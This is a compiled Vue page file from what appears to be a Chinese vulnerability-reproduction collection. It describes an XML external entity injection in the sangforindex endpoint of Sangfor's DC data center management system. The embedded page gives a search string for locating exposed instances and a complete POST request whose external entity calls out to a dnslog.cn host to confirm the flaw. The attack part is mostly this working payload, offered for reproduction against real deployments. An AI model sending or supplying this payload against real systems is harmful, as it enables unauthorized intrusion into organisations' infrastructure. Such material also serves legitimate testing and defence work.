import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>深信服 DC数据中心管理系统</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;SANGFOR 数据中心&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828143259744.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /src/sangforindex HTTP/1.1
Host: 
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY rootas SYSTEM &quot;http://xgsg1k.dnslog.cn&quot;&gt;
]&gt;
&lt;xxx&gt;
&amp;rootas;
&lt;/xxx&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828143318826.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),s=[d];function r(l,o){return a(),i("div",null,s)}const g=e(t,[["render",r],["__file","深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞.html.vue"]]);export{g as default};
